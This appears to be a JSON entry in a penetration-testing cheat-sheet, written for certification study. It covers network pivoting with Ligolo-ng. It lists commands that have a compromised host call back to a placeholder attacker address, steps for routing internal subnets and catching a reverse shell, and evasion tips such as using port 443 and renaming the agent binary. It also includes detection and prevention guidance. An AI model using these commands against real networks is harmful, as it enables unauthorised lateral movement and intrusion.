@@ -1,0 +1,136 @@
+{
+  "id": "ligolo-ng-pivot",
+  "name": "Ligolo-ng - TUN-Interface Pivot (no proxychains)",
+  "command": "./agent -connect <attacker_ip>:11601 -ignore-cert",
+  "description": "Ligolo-ng pivots by creating a virtual TUN interface on the attack host, so you reach the internal subnet with normal tools (nmap, crackmapexec, browsers) - no proxychains, no per-tool SOCKS config. Run the proxy on your attack host, the agent on the compromised pivot, add a route to the internal subnet via the ligolo interface, then start the tunnel.",
+  "platform": "linux",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "ligolo-ng"
+  ],
+  "tags": [
+    "ligolo",
+    "ligolo-ng",
+    "pivoting",
+    "tunnel",
+    "tun-interface",
+    "socks-less"
+  ],
+  "category": "Pivoting & Tunneling",
+  "subcategory": "SOCKS Tunneling",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 12: Pivoting, Tunneling, and Port Forwarding",
+  "opsec": "moderate",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1090.001"
+  ],
+  "steps": [
+    {
+      "label": "Attacker: create the ligolo TUN interface (once)",
+      "command": "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"
+    },
+    {
+      "label": "Attacker: start the proxy (listens on 11601)",
+      "command": "./proxy -selfcert   # -laddr 0.0.0.0:11601 by default"
+    },
+    {
+      "label": "Pivot: connect the agent back to the proxy",
+      "command": "./agent -connect <attacker_ip>:11601 -ignore-cert"
+    },
+    {
+      "label": "Proxy console: select the agent session",
+      "command": "session   # then pick the numbered session"
+    },
+    {
+      "label": "Attacker: route the internal subnet through the tunnel",
+      "command": "sudo ip route add <internal_subnet>/24 dev ligolo"
+    },
+    {
+      "label": "Proxy console: start the tunnel, then use tools normally",
+      "command": "start   # now: nmap -sT -Pn <internal_ip> (no proxychains needed)"
+    },
+    {
+      "label": "RE-SCAN from the new network position (do not skip)",
+      "command": "nmap -sT -Pn -p- <internal_subnet>/24   # re-enumerate every hop; new subnet = new attack surface"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Windows agent on the pivot",
+      "command": "agent.exe -connect <attacker_ip>:11601 -ignore-cert"
+    },
+    {
+      "label": "Reverse port-forward: catch a reverse shell from an internal host",
+      "command": "# in the proxy session for the agent:\nlistener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n# internal host connects to <pivot_ip>:4444 -> arrives on your 127.0.0.1:4444"
+    },
+    {
+      "label": "Verify the route is present",
+      "command": "ip route | grep ligolo"
+    }
+  ],
+  "notes": "Why ligolo over chisel/proxychains: it gives you a real routed interface, so ALL tools work natively (including tools that ignore proxychains, and raw ICMP with --tun ping). Workflow recap: proxy (attacker) <- agent (pivot) ; session -> ip route add ... dev ligolo -> start. Double-pivot: run a second agent on the next host and add its subnet route too. GOTCHA (from exam notes / DO-NOT-REPEAT): ALWAYS re-scan and re-enumerate after the tunnel is up - the new subnet is fresh attack surface, and forgetting to rescan after a pivot is a classic time-sink. Update /etc/hosts with any internal names you discover. Agent needs -ignore-cert when the proxy uses -selfcert.",
+  "references": [
+    {
+      "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
+      "url": "https://academy.hackthebox.com/module/details/158"
+    },
+    {
+      "title": "ligolo-ng (nicocha30)",
+      "url": "https://github.com/nicocha30/ligolo-ng"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "chisel-socks",
+      "note": "SOCKS-based alternative when a TUN interface isn't an option",
+      "rel": "alternative"
+    },
+    {
+      "id": "sshuttle",
+      "note": "Transparent SSH VPN pivot (Linux pivots with SSH access)",
+      "rel": "alternative"
+    }
+  ],
+  "variations": [
+    {
+      "label": "Proxy with a custom listen port",
+      "command": "./proxy -selfcert -laddr 0.0.0.0:443"
+    },
+    {
+      "label": "Agent over an allowed egress port (443)",
+      "command": "./agent -connect <attacker_ip>:443 -ignore-cert"
+    },
+    {
+      "label": "Add another internal route (double pivot)",
+      "command": "sudo ip route add <second_subnet>/24 dev ligolo"
+    }
+  ],
+  "type": "command",
+  "defense": {
+    "why_it_works": "Ligolo-ng tunnels layer-3 traffic between the attacker's TUN interface and the compromised pivot over a single TLS connection the agent initiates outbound to the proxy. Because the pivot originates the connection (often over 443) and the attacker routes whole subnets through the virtual interface, one foothold bridges network segments it was never meant to connect, with no listening port on the pivot and no SOCKS config needed.",
+    "prerequisites": "Code execution on a pivot host with an allowed outbound path to the attacker (commonly 443). Matching ligolo-ng agent/proxy binaries. Ability to add a route on the attack host (root).",
+    "impact": "T1090.001 Internal Proxy. Full routed access to internal subnets reachable from the pivot - the attacker uses native tooling against otherwise-unreachable hosts, enabling lateral movement and deeper compromise.",
+    "detection": "A pivot host holding a long-lived outbound TLS connection to an unusual external/attacker IP. East-west/NetFlow: traffic to internal hosts appearing to originate from the pivot on ports it never normally uses. On the pivot: an unexpected agent process (often a randomly-named binary) with an outbound socket. EDR: a non-browser process making sustained TLS to a non-corporate endpoint.",
+    "artifacts": "The ligolo agent process + its outbound TLS socket on the pivot | new east-west flows sourced from the pivot | self-signed cert on the tunnel when -selfcert/-ignore-cert are used",
+    "prevention": "[M1030 Network Segmentation] strict east-west firewall rules so a single foothold cannot reach other segments; egress filtering (block/inspect outbound TLS to arbitrary hosts, force through an inspecting proxy); alert on long-lived outbound connections from server workloads; application allowlisting on servers to stop unknown agent binaries.",
+    "evasion": "Connect the agent over 443 so the tunnel blends with normal HTTPS egress; keep the agent binary renamed and short-lived; avoid noisy full-subnet scans immediately after connecting.",
+    "sources": [
+      "HTB M12",
+      "MITRE T1090.001",
+      "https://github.com/nicocha30/ligolo-ng"
+    ],
+    "misconfiguration": "Flat network with no east-west segmentation and unrestricted outbound TLS lets a DMZ/pivot host route the attacker straight into internal subnets.",
+    "vulnerable_config": "# Pivot can reach internal subnets AND has unrestricted outbound 443:\niptables -L OUTPUT   # policy ACCEPT\n# -> ./agent -connect attacker:443 -ignore-cert ; attacker: ip route add 10.10.20.0/24 dev ligolo\n# attacker now has native routed access to 10.10.20.0/24",
+    "secure_config": "# Egress filtering: block outbound 443 except to known destinations via an inspecting proxy\niptables -P OUTPUT DROP\niptables -A OUTPUT -p tcp --dport 443 -d <corp_proxy> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n# Segment DMZ from internal tiers; alert on long-lived outbound TLS from servers;\n# application allowlisting to block unsigned/unknown agent binaries."
+  }
+}
